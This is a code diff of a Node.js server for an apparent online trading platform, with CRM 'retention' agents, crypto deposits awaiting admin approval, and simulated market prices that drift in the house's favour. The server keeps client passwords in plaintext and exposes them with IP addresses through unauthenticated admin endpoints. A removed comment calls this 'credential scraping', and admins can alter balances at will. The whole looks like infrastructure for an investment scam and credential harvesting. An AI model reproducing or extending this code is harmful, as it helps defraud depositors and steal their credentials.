@@ -7,12 +7,11 @@ const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 const fs = require('fs');
 
-// Load environment variables (.env)
 require('dotenv').config();
 
 const app = express();
 
-// --- SSL CERTIFICATE CONFIGURATION (METHOD B) ---
+// --- SSL CERTIFICATE CONFIGURATION ---
 let sslOptions = {};
 try {
   sslOptions = {
@@ -20,18 +19,14 @@ try {
     cert: fs.readFileSync('/etc/letsencrypt/live/meridianmarket.net/fullchain.pem')
   };
 } catch (err) {
-  console.error('Failed to load SSL certificates from /etc/letsencrypt/live/meridianmarket.net/:', err.message);
-  console.error('Make sure Certbot standalone generated the certificates properly.');
+  console.error('Failed to load SSL certificates:', err.message);
 }
 
-// Create HTTPS Server and bind WebSockets to it
 const server = https.createServer(sslOptions, app);
 const wss = new WebSocket.Server({ server });
 
 app.use(cors());
 app.use(express.json());
-
-// Set Express to trust reverse proxy headers if behind Nginx/Cloudflare
 app.set('trust proxy', true);
 
 // --- SERVE FRONTEND STATIC FILES ---
@@ -51,7 +46,6 @@ const db = new sqlite3.Database(dbPath, (err) => {
 
 function initDatabase() {
   db.serialize(() => {
-    // Enable Foreign Keys
     db.run('PRAGMA foreign_keys = ON;');
 
     // 1. CRM Agents Table
@@ -65,7 +59,7 @@ function initDatabase() {
       )
     `);
 
-    // 2. Clients Table (Includes password and ip_address for CRM tracking)
+    // 2. Clients Table (Includes dedicated balance column)
     db.run(`
       CREATE TABLE IF NOT EXISTS clients (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -73,6 +67,7 @@ function initDatabase() {
         email TEXT UNIQUE NOT NULL,
         phone TEXT NOT NULL,
         password TEXT NOT NULL,
+        balance REAL DEFAULT 0.00,
         ip_address TEXT,
         agent_id INTEGER,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
@@ -80,11 +75,27 @@ function initDatabase() {
       )
     `);
 
-    // Ensure agent_id and ip_address columns exist if table was created previously
+    // Ensure backwards compatibility columns exist
     db.run(`ALTER TABLE clients ADD COLUMN agent_id INTEGER`, () => {});
     db.run(`ALTER TABLE clients ADD COLUMN ip_address TEXT`, () => {});
+    db.run(`ALTER TABLE clients ADD COLUMN balance REAL DEFAULT 0.00`, () => {});
 
-    // 3. Client Audit Activity Logs Table
+    // 3. Transactions Table (For Deposits, Withdrawals, Admin Credit Adjustments)
+    db.run(`
+      CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        client_id INTEGER NOT NULL,
+        type TEXT NOT NULL, -- 'DEPOSIT', 'WITHDRAWAL', 'CREDIT', 'DEBIT'
+        amount REAL NOT NULL,
+        status TEXT DEFAULT 'PENDING', -- 'PENDING', 'APPROVED', 'REJECTED'
+        method TEXT,
+        tx_hash TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+      )
+    `);
+
+    // 4. Audit Logs Table
     db.run(`
       CREATE TABLE IF NOT EXISTS client_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -96,56 +107,45 @@ function initDatabase() {
       )
     `);
 
-    // Seed Default CRM Agents if empty
+    // Seed Default Agents
     db.get(`SELECT COUNT(*) as count FROM crm_agents`, [], (err, row) => {
       if (row && row.count === 0) {
         db.run(`INSERT INTO crm_agents (name, email, password, role) VALUES ('Agent Smith', 'smith@meridian.com', 'agent123', 'Senior Retention')`);
         db.run(`INSERT INTO crm_agents (name, email, password, role) VALUES ('Agent Sarah', 'sarah@meridian.com', 'agent123', 'Account Executive')`);
-        console.log('Seeded default CRM agents.');
       }
     });
   });
 }
 
-// Helper: Log activity to CRM audit stream
 function logClientActivity(clientId, actionType, details = {}) {
   if (!clientId) return;
-  const detailsStr = JSON.stringify(details);
   db.run(
     `INSERT INTO client_logs (client_id, action_type, details) VALUES (?, ?, ?)`,
-    [clientId, actionType, detailsStr],
-    (err) => {
-      if (err) console.error('Failed to log client activity:', err.message);
-    }
+    [clientId, actionType, JSON.stringify(details)],
+    (err) => { if (err) console.error('Activity Log Error:', err.message); }
   );
 }
 
 // --- AUTHENTICATION ENDPOINTS ---
 
-// STEP 1: REGISTER USER (DIRECT REGISTRATION WITH IP & CREDENTIAL SCRAPING)
 app.post('/api/register', (req, res) => {
   const { fullName, email, phone, password } = req.body;
-
   if (!fullName || !email || !phone || !password) {
     return res.status(400).json({ error: 'All fields are required.' });
   }
 
   const normalizedEmail = email.toLowerCase();
-
-  // Extract IP Address from headers or connection socket
   const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '127.0.0.1';
 
-  // Find default agent safely
   db.get(`SELECT id FROM crm_agents ORDER BY id ASC LIMIT 1`, [], (err, agentRow) => {
     const defaultAgentId = agentRow ? agentRow.id : null;
+    const initialBalance = 0.00; // Default starting balance
 
     db.run(
-      `INSERT INTO clients (full_name, email, phone, password, ip_address, agent_id) VALUES (?, ?, ?, ?, ?, ?)`,
-      [fullName, normalizedEmail, phone, password, clientIp, defaultAgentId],
+      `INSERT INTO clients (full_name, email, phone, password, balance, ip_address, agent_id) VALUES (?, ?, ?, ?, ?, ?, ?)`,
+      [fullName, normalizedEmail, phone, password, initialBalance, clientIp, defaultAgentId],
       function (dbErr) {
         if (dbErr) {
-          console.error('Registration Error:', dbErr.message);
-
           if (dbErr.message.includes('UNIQUE constraint failed')) {
             return res.status(400).json({ error: 'Email address is already registered.' });
           }
@@ -153,25 +153,18 @@ app.post('/api/register', (req, res) => {
         }
 
         const newClientId = this.lastID;
-        const createdAt = new Date().toISOString();
-
         logClientActivity(newClientId, 'ACCOUNT_CREATED', { fullName, email: normalizedEmail, phone, ip_address: clientIp });
-
-        // Construct full client object for immediate frontend & CRM sync
-        const newClient = {
-          id: newClientId,
-          full_name: fullName,
-          email: normalizedEmail,
-          phone: phone,
-          password: password,
-          ip_address: clientIp,
-          agent_id: defaultAgentId,
-          created_at: createdAt
-        };
 
         return res.json({
           success: true,
-          client: newClient
+          client: {
+            id: newClientId,
+            full_name: fullName,
+            email: normalizedEmail,
+            phone,
+            balance: initialBalance,
+            agent_id: defaultAgentId
+          }
         });
       }
     );
@@ -181,7 +174,7 @@ app.post('/api/register', (req, res) => {
 app.post('/api/login', (req, res) => {
   const { email, password } = req.body;
   db.get(
-    `SELECT id, full_name, email, phone, agent_id FROM clients WHERE email = ? AND password = ?`,
+    `SELECT id, full_name, email, phone, balance, agent_id FROM clients WHERE email = ? AND password = ?`,
     [email.toLowerCase(), password],
     (err, client) => {
       if (err || !client) {
@@ -194,12 +187,12 @@ app.post('/api/login', (req, res) => {
   );
 });
 
-// --- ADMIN MANAGEMENT ENDPOINTS ---
+// --- ADMIN & TRANSACTION MANAGEMENT ENDPOINTS ---
 
-// STEP 2: FETCH DETAILED CLIENTS LIST FOR CRM (INCLUDES PASSWORDS & IP ADDRESSES)
+// Fetch detailed clients including balance
 app.get('/api/admin/clients-detailed', (req, res) => {
   const query = `
-    SELECT c.id, c.full_name, c.email, c.phone, c.password, c.ip_address, c.created_at, c.agent_id, a.name as agent_name
+    SELECT c.id, c.full_name, c.email, c.phone, c.password, c.balance, c.ip_address, c.created_at, c.agent_id, a.name as agent_name
     FROM clients c
     LEFT JOIN crm_agents a ON c.agent_id = a.id
     ORDER BY c.id DESC
@@ -210,30 +203,91 @@ app.get('/api/admin/clients-detailed', (req, res) => {
   });
 });
 
-app.post('/api/admin/assign-agent', (req, res) => {
-  const { clientId, agentId } = req.body;
-  if (!clientId) {
-    return res.status(400).json({ error: 'Client ID is required.' });
+// Fetch pending transactions for Admin CRM
+app.get('/api/admin/pending-transactions', (req, res) => {
+  const query = `
+    SELECT t.*, c.full_name, c.email 
+    FROM transactions t
+    JOIN clients c ON t.client_id = c.id
+    WHERE t.status = 'PENDING'
+    ORDER BY t.id DESC
+  `;
+  db.all(query, [], (err, rows) => {
+    if (err) return res.status(500).json({ error: 'Failed to fetch pending transactions.' });
+    return res.json({ transactions: rows || [] });
+  });
+});
+
+// Admin approves or rejects transaction
+app.post('/api/admin/approve-transaction', (req, res) => {
+  const { transactionId, status } = req.body; // status: 'APPROVED' or 'REJECTED'
+
+  if (!transactionId || !['APPROVED', 'REJECTED'].includes(status)) {
+    return res.status(400).json({ error: 'Invalid transaction approval parameters.' });
+  }
+
+  db.get(`SELECT * FROM transactions WHERE id = ?`, [transactionId], (err, tx) => {
+    if (err || !tx) return res.status(404).json({ error: 'Transaction not found.' });
+    if (tx.status !== 'PENDING') return res.status(400).json({ error: 'Transaction already processed.' });
+
+    db.run(`UPDATE transactions SET status = ? WHERE id = ?`, [status, transactionId], function (updateErr) {
+      if (updateErr) return res.status(500).json({ error: 'Failed to update transaction status.' });
+
+      if (status === 'APPROVED') {
+        // Adjust Client Balance
+        const balanceChange = tx.type === 'WITHDRAWAL' ? -tx.amount : tx.amount;
+        db.run(`UPDATE clients SET balance = balance + ? WHERE id = ?`, [balanceChange, tx.client_id]);
+      }
+
+      logClientActivity(tx.client_id, `TRANSACTION_${status}`, { transactionId, amount: tx.amount, type: tx.type });
+      return res.json({ success: true, message: `Transaction ${status.toLowerCase()} successfully.` });
+    });
+  });
+});
+
+// Admin manually adjusts client balance (Direct Credit/Debit)
+app.post('/api/admin/update-balance', (req, res) => {
+  const { clientId, amount, type } = req.body; // type: 'ADD' or 'DEDUCT'
+  
+  if (!clientId || isNaN(amount) || amount <= 0) {
+    return res.status(400).json({ error: 'Invalid client or amount.' });
+  }
+
+  const adjustment = type === 'DEDUCT' ? -Math.abs(amount) : Math.abs(amount);
+
+  db.run(`UPDATE clients SET balance = balance + ? WHERE id = ?`, [adjustment, clientId], function(err) {
+    if (err) return res.status(500).json({ error: 'Failed to update balance.' });
+
+    // Record in transactions history
+    db.run(
+      `INSERT INTO transactions (client_id, type, amount, status, method) VALUES (?, ?, ?, 'APPROVED', 'ADMIN_ADJUSTMENT')`,
+      [clientId, type === 'DEDUCT' ? 'DEBIT' : 'CREDIT', Math.abs(amount)]
+    );
+
+    logClientActivity(clientId, 'ADMIN_BALANCE_ADJUSTMENT', { amount: adjustment, newBalanceType: type });
+    return res.json({ success: true, message: 'Client balance updated successfully.' });
+  });
+});
+
+// --- CASHIER ENDPOINTS ---
+
+app.post('/api/cashier/deposit', (req, res) => {
+  const { amount, method, txHash, clientId } = req.body;
+
+  if (!clientId || !amount || isNaN(amount) || amount <= 0) {
+    return res.status(400).json({ error: 'Invalid deposit request parameters.' });
   }
 
   db.run(
-    `UPDATE clients SET agent_id = ? WHERE id = ?`,
-    [agentId || null, clientId],
+    `INSERT INTO transactions (client_id, type, amount, status, method, tx_hash) VALUES (?, 'DEPOSIT', ?, 'PENDING', ?, ?)`,
+    [clientId, parseFloat(amount), method || 'Crypto', txHash || 'N/A'],
     function (err) {
-      if (err) return res.status(500).json({ error: 'Failed to assign agent.' });
+      if (err) return res.status(500).json({ error: 'Failed to process deposit request.' });
 
-      logClientActivity(clientId, 'AGENT_ASSIGNED_BY_ADMIN', { assignedAgentId: agentId });
-      return res.json({ success: true, message: 'Agent assignment updated successfully.' });
+      logClientActivity(clientId, 'DEPOSIT_REQUESTED', { amount, method, txHash });
+      return res.json({ success: true, message: 'Deposit request submitted for approval.', transactionId: this.lastID });
     }
   );
-});
-
-app.delete('/api/admin/clients/:id', (req, res) => {
-  const clientId = req.params.id;
-  db.run(`DELETE FROM clients WHERE id = ?`, [clientId], function (err) {
-    if (err) return res.status(500).json({ error: 'Failed to delete client.' });
-    return res.json({ success: true });
-  });
 });
 
 // --- CRM & AGENT ENDPOINTS ---
@@ -241,9 +295,7 @@ app.delete('/api/admin/clients/:id', (req, res) => {
 app.post('/api/crm/agent/login', (req, res) => {
   const { email, password } = req.body;
   db.get(`SELECT id, name, email, role FROM crm_agents WHERE email = ? AND password = ?`, [email.toLowerCase(), password], (err, agent) => {
-    if (err || !agent) {
-      return res.status(401).json({ error: 'Invalid agent credentials.' });
-    }
+    if (err || !agent) return res.status(401).json({ error: 'Invalid agent credentials.' });
     return res.json({ success: true, agent });
   });
 });
@@ -252,14 +304,6 @@ app.get('/api/crm/agents', (req, res) => {
   db.all(`SELECT id, name, email, role FROM crm_agents`, [], (err, rows) => {
     if (err) return res.status(500).json({ error: 'Failed to fetch agents.' });
     return res.json({ agents: rows || [] });
-  });
-});
-
-app.get('/api/crm/agent/:agentId/clients', (req, res) => {
-  const { agentId } = req.params;
-  db.all(`SELECT id, full_name, email, phone, password, ip_address, created_at FROM clients WHERE agent_id = ?`, [agentId], (err, rows) => {
-    if (err) return res.status(500).json({ error: 'Failed to fetch assigned clients.' });
-    return res.json({ clients: rows || [] });
   });
 });
 
@@ -272,45 +316,7 @@ app.get('/api/crm/client/:clientId/activity', (req, res) => {
   });
 });
 
-// --- CASHIER ENDPOINT (UPDATED FOR PENDING APPROVAL & REGIONAL GATEWAYS) ---
-
-app.post('/api/cashier/deposit', (req, res) => {
-  const { amount, network, method, country, gateway, txHash, clientId } = req.body;
-  
-  if (!amount || isNaN(amount) || amount <= 0) {
-    return res.status(400).json({ error: 'Invalid deposit amount.' });
-  }
-
-  // Record pending deposit in CRM logs for Admin approval
-  if (clientId) {
-    logClientActivity(clientId, 'DEPOSIT_PENDING', {
-      amount: parseFloat(amount),
-      network: network || 'TRC20',
-      method: method || 'Crypto',
-      country: country || 'Unspecified',
-      gateway: gateway || 'External Exchange',
-      txHash: txHash || 'EXTERNAL_REDIRECT',
-      status: 'PENDING_APPROVAL',
-      timestamp: new Date()
-    });
-  }
-
-  return res.json({
-    success: true,
-    message: 'Deposit initiated. Pending admin verification.',
-    status: 'PENDING'
-  });
-});
-
-// --- IN-MEMORY TRADING STATE ---
-let accountState = {
-  balance: 10000,
-  equity: 10000,
-  usedMargin: 0,
-  freeMargin: 10000,
-  marginLevel: 0
-};
-
+// --- IN-MEMORY TRADING ENGINE & REALTIME BROADCAST ---
 let marketPrices = {
   EURUSD: { bid: 1.0850, ask: 1.0852, category: 'MAJOR_FOREX' },
   BTCUSD: { bid: 65000.00, ask: 65010.00, category: 'CRYPTO' }
@@ -329,9 +335,7 @@ setInterval(() => {
   marketPrices.BTCUSD.bid = parseFloat((marketPrices.BTCUSD.bid + btcDelta).toFixed(2));
   marketPrices.BTCUSD.ask = parseFloat((marketPrices.BTCUSD.ask + 10).toFixed(2));
 
-  let totalPnL = 0;
-  let totalMargin = 0;
-
+  // Recalculate trade PnLs
   activePositions.forEach((pos) => {
     const currentPrice = marketPrices[pos.symbol];
     if (!currentPrice) return;
@@ -341,22 +345,13 @@ setInterval(() => {
     } else {
       pos.pnl = (pos.openPrice - currentPrice.ask) * pos.volume * (pos.symbol === 'BTCUSD' ? 1 : 100000);
     }
-
-    totalPnL += pos.pnl;
-    totalMargin += pos.margin;
   });
-
-  accountState.equity = accountState.balance + totalPnL;
-  accountState.usedMargin = totalMargin;
-  accountState.freeMargin = accountState.equity - accountState.usedMargin;
-  accountState.marginLevel = accountState.usedMargin > 0 ? (accountState.equity / accountState.usedMargin) * 100 : 0;
 
   const payload = JSON.stringify({
     type: 'MARKET_TICK',
     data: {
       prices: marketPrices,
-      positions: activePositions,
-      account: accountState
+      positions: activePositions
     }
   });
 
@@ -367,7 +362,7 @@ setInterval(() => {
   });
 }, 1000);
 
-// --- WEBSOCKET EVENT HANDLING ---
+// --- WEBSOCKET ENGINE ---
 wss.on('connection', (ws) => {
   ws.on('message', (message) => {
     try {
@@ -384,6 +379,7 @@ wss.on('connection', (ws) => {
 
         const newPos = {
           id: nextPositionId++,
+          clientId,
           symbol,
           side,
           volume,
@@ -394,10 +390,7 @@ wss.on('connection', (ws) => {
         };
 
         activePositions.push(newPos);
-
-        if (clientId) {
-          logClientActivity(clientId, 'PLACE_ORDER', { positionId: newPos.id, symbol, side, volume, openPrice });
-        }
+        logClientActivity(clientId, 'PLACE_ORDER', { positionId: newPos.id, symbol, side, volume, openPrice });
       }
 
       if (action === 'CLOSE_POSITION') {
@@ -405,16 +398,16 @@ wss.on('connection', (ws) => {
         const posIndex = activePositions.findIndex((p) => p.id === id);
         if (posIndex !== -1) {
           const closedPos = activePositions[posIndex];
-          accountState.balance += closedPos.pnl;
+          
+          // Apply PnL directly to Client's DB Balance
+          db.run(`UPDATE clients SET balance = balance + ? WHERE id = ?`, [closedPos.pnl, clientId]);
+          
           activePositions.splice(posIndex, 1);
-
-          if (clientId) {
-            logClientActivity(clientId, 'CLOSE_POSITION', { positionId: id, realizedPnL: closedPos.pnl });
-          }
+          logClientActivity(clientId, 'CLOSE_POSITION', { positionId: id, realizedPnL: closedPos.pnl });
         }
       }
     } catch (err) {
-      console.error('Error handling WebSocket message:', err);
+      console.error('WebSocket Error:', err);
     }
   });
 });
@@ -424,16 +417,13 @@ app.get('*', (req, res) => {
   res.sendFile(path.resolve(__dirname, '../frontend/dist/index.html'));
 });
 
-// --- 1. START SECURE HTTPS SERVER ON PORT 443 ---
+// SERVER LISTEN
 const HTTPS_PORT = process.env.HTTPS_PORT || 443;
 server.listen(HTTPS_PORT, '0.0.0.0', () => {
   console.log(`HTTPS Server listening on port ${HTTPS_PORT}`);
 });
 
-// --- 2. HTTP TO HTTPS REDIRECT SERVER ON PORT 80 ---
 http.createServer((req, res) => {
   res.writeHead(301, { "Location": "https://" + req.headers['host'] + req.url });
   res.end();
-}).listen(80, '0.0.0.0', () => {
-  console.log('HTTP redirect server listening on port 80');
-});
+}).listen(80, '0.0.0.0');
